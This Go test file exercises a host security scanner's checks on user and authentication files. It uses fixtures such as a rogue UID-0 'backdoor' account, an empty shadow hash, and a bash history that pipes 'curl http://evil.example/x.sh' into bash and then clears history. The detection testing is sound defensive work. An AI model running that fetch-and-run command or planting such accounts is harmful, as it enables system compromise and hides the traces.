package categories_test

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/medunes/misbar/internal/scanner"
	"github.com/medunes/misbar/internal/scanner/categories"
)

func TestPasswdRogueUID0IsCrit(t *testing.T) {
	root := writeTree(t, map[string]string{
		"etc/passwd": "root:x:0:0:root:/root:/bin/bash\n" +
			"backdoor:x:0:0::/home/backdoor:/bin/bash\n" +
			"alice:x:1000:1000::/home/alice:/bin/bash\n",
	})
	res := runArtifact(t, categories.AuthUsers(), testEnv(root), "passwd")
	if res.Health != scanner.HealthCrit {
		t.Fatalf("health = %v, want CRIT", res.Health)
	}
	if !hasAnomaly(res, "UID 0") {
		t.Errorf("expected a UID-0 anomaly, got %+v", res.Anomalies)
	}
}

func TestPasswdCleanIsOK(t *testing.T) {
	root := writeTree(t, map[string]string{
		"etc/passwd": "root:x:0:0:root:/root:/bin/bash\nalice:x:1000:1000::/home/alice:/bin/bash\n",
	})
	res := runArtifact(t, categories.AuthUsers(), testEnv(root), "passwd")
	if res.Health != scanner.HealthOK {
		t.Errorf("clean passwd health = %v, want OK", res.Health)
	}
}

func TestShadowEmptyHashIsCritAndRedacted(t *testing.T) {
	root := writeTree(t, map[string]string{
		"etc/shadow": "root:$6$abc$deadbeefhash:19000:0:99999:7:::\n" +
			"nopass::19000:0:99999:7:::\n",
	})
	res := runArtifact(t, categories.AuthUsers(), testEnv(root), "shadow")
	if res.Health != scanner.HealthCrit {
		t.Fatalf("health = %v, want CRIT", res.Health)
	}
	if !hasAnomaly(res, "empty password") {
		t.Errorf("expected empty-hash anomaly, got %+v", res.Anomalies)
	}
	if strings.Contains(res.Content.Text, "deadbeefhash") {
		t.Errorf("password hash leaked into content: %q", res.Content.Text)
	}
}

func TestSudoersNOPASSWDIsWarn(t *testing.T) {
	root := writeTree(t, map[string]string{
		"etc/sudoers": "root ALL=(ALL:ALL) ALL\nalice ALL=(ALL) NOPASSWD: ALL\n",
	})
	res := runArtifact(t, categories.AuthUsers(), testEnv(root), "sudoers")
	if res.Health != scanner.HealthWarn {
		t.Errorf("health = %v, want WARN", res.Health)
	}
	if !hasAnomaly(res, "NOPASSWD") {
		t.Errorf("expected NOPASSWD anomaly, got %+v", res.Anomalies)
	}
}

func TestGroupPrivilegedMembershipIsWarn(t *testing.T) {
	root := writeTree(t, map[string]string{
		"etc/group": "root:x:0:\nsudo:x:27:alice,bob\nusers:x:100:alice\n",
	})
	res := runArtifact(t, categories.AuthUsers(), testEnv(root), "group")
	if res.Health != scanner.HealthWarn {
		t.Errorf("health = %v, want WARN", res.Health)
	}
	if !hasAnomaly(res, "privileged group") {
		t.Errorf("expected privileged-group anomaly, got %+v", res.Anomalies)
	}
}

func TestBashHistoryPipeToShellIsCrit(t *testing.T) {
	root := writeTree(t, map[string]string{
		"etc/passwd":               "alice:x:1000:1000::/home/alice:/bin/bash\n",
		"home/alice/.bash_history": "ls -la\ncurl http://evil.example/x.sh | bash\nhistory -c\n",
	})
	res := runArtifact(t, categories.AuthUsers(), testEnv(root), "bash_history")
	if res.Health != scanner.HealthCrit {
		t.Fatalf("health = %v, want CRIT", res.Health)
	}
	if !hasAnomaly(res, "pipe-to-shell") {
		t.Errorf("expected pipe-to-shell anomaly, got %+v", res.Anomalies)
	}
	if !hasAnomaly(res, "history cleared") {
		t.Errorf("expected history-cleared anomaly, got %+v", res.Anomalies)
	}
}

func TestSSHKeysCommandRestrictionIsWarn(t *testing.T) {
	root := writeTree(t, map[string]string{
		"etc/passwd": "alice:x:1000:1000::/home/alice:/bin/bash\n",
		"home/alice/.ssh/authorized_keys": `command="/bin/backup" ssh-rsa AAAAB3NzaC1 alice@host` + "\n" +
			"ssh-ed25519 AAAAC3NzaC1 alice@laptop\n",
	})
	res := runArtifact(t, categories.AuthUsers(), testEnv(root), "ssh-keys")
	if res.Health != scanner.HealthWarn {
		t.Fatalf("health = %v, want WARN (summary %q)", res.Health, res.Summary)
	}
	if !hasAnomaly(res, "command=") {
		t.Errorf("expected command= anomaly, got %+v", res.Anomalies)
	}
}

func TestWtmpSessionsParsed(t *testing.T) {
	var wtmp []byte
	wtmp = append(wtmp, buildUtmp(7, "alice", "pts/0", "10.0.0.5", fixedNow)...)
	wtmp = append(wtmp, buildUtmp(7, "root", "tty1", "", fixedNow)...)
	root := writeTree(t, map[string]string{"var/log/wtmp": string(wtmp)})

	res := runArtifact(t, categories.AuthUsers(), testEnv(root), "wtmp")
	if res.Health != scanner.HealthOK {
		t.Errorf("health = %v, want OK", res.Health)
	}
	if !strings.Contains(res.Summary, "2 login") {
		t.Errorf("summary = %q, want 2 sessions", res.Summary)
	}
	if !strings.Contains(res.Content.Text, "alice") || !strings.Contains(res.Content.Text, "10.0.0.5") {
		t.Errorf("wtmp content missing session data: %q", res.Content.Text)
	}
}

func TestPermissionDeniedIsSkipLocked(t *testing.T) {
	if os.Geteuid() == 0 {
		t.Skip("cannot exercise permission denial as root")
	}
	root := writeTree(t, map[string]string{"etc/shadow": "root:x:0::\n"})
	if err := os.Chmod(filepath.Join(root, "etc/shadow"), 0o000); err != nil {
		t.Fatal(err)
	}
	res := runArtifact(t, categories.AuthUsers(), testEnv(root), "shadow")
	if res.Health != scanner.HealthSkip {
		t.Errorf("health = %v, want SKIP", res.Health)
	}
	if !res.Locked {
		t.Error("expected Locked=true for a permission-denied file")
	}
}
